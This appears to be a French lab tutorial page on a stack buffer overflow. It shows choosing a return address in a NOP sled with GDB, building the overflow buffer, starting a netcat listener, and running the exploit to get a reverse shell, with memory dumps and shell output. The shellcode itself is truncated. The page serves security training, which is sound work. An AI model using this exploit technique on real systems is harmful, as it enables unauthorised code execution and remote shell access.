# Identification of the Return Address

***

### <mark style="color:red;">🔹 Identification de l’adresse de retour</mark>

Après avoir vérifié que nous contrôlons toujours l’EIP avec notre shellcode, il nous faut maintenant une **adresse mémoire** où se trouvent nos **NOPs** pour dire à l’EIP de sauter dessus.\
Cette adresse mémoire **ne doit pas contenir de bad characters** que nous avons identifiés précédemment.

***

#### <mark style="color:green;">🔹 GDB – NOPs</mark>

```bash
(gdb) x/2000xb $esp+1400
```

{% code fullWidth="true" %}
```nasm
<SNIP>
0xffffd5ec:  0x55 0x55 0x55 0x55 0x55 0x55 0x55 0x55
0xffffd5f4:  0x55 0x55 0x55 0x55 0x55 0x55 0x90 0x90
                                 # Fin des "\x55" ---->|  |---> NOPs
0xffffd5fc:  0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd604:  0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd60c:  0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd614:  0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd61c:  0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd624:  0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd62c:  0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd634:  0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd63c:  0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd644:  0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd64c:  0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd654:  0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd65c:  0x90 0x90 0xda 0xca 0xba 0xe4 0x11 0xd4
                             # |---> Shellcode
<SNIP>
```
{% endcode %}

Ici, nous devons maintenant choisir une adresse vers laquelle pointer l’EIP, et qui va exécuter les instructions **octet par octet à partir de cette adresse**.\
Dans cet exemple, nous choisissons **l’adresse `0xffffd64c`**.

<figure><img src="../../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

***

#### <mark style="color:green;">🔹 Schéma du buffer (visualisation)</mark>

On a :

* `841` octets de remplissage (`\x55`)
* `100` octets de NOPs (`\x90`)
* `95` octets de shellcode
* `4` octets pour écraser l’EIP

Ainsi, le flux d’exécution saute dans la zone des NOPs, puis glisse jusqu’au shellcode.

***

#### <mark style="color:green;">🔹 Notes (calculs)</mark>

```
   Buffer   = "\x55" * (1040 - 100 - 95 - 4) = 841
   NOPs     = "\x90" * 100
   Shellcode= "\xda\xca\xba\xe4\x11\xd4...<SNIP>...\x5a\x22\xa2"
   EIP      = "\x4c\xd6\xff\xff"
```

⚠️ Remarque : l’adresse `0xffffd64c` est écrite **à l’envers** dans le buffer (`little endian`) → `\x4c\xd6\xff\xff`.

***

#### <mark style="color:green;">🔹 Mise en place du listener Netcat</mark>

Comme notre shellcode ouvre un **reverse shell**, nous lançons `netcat` en écoute sur le port `31337` :

```bash
student@nix-bow:$ nc -nlvp 31337
```

```
Listening on [0.0.0.0] (family 0, port 31337)
```

***

#### <mark style="color:green;">🔹 Exécution de l’exploit</mark>

On exécute à nouveau notre exploit avec le shellcode et l’adresse corrigée :

{% code fullWidth="true" %}
```bash
(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 95 - 4) + "\x90" * 100 + "\xda\xca\xba...<SNIP>...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"')
```
{% endcode %}

***

#### <mark style="color:green;">🔹 Résultat côté Netcat</mark>

```
Listening on [0.0.0.0] (family 0, port 31337)
Connection from 127.0.0.1 33504 received!
```

On teste si le shell est bien actif avec la commande `id` :

```
id
uid=1000(student) gid=1000(student) groups=1000(student),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
```

✅ Nous voyons que nous avons bien une connexion depuis l’IP locale et que nous sommes dans un shell.

***

👉 Donc, en résumé :

1. On choisit une adresse **dans les NOPs**.
2. On remplace l’EIP par cette adresse (en little endian).
3. On écoute avec `netcat`.
4. On lance l’exploit → on obtient un shell.

***
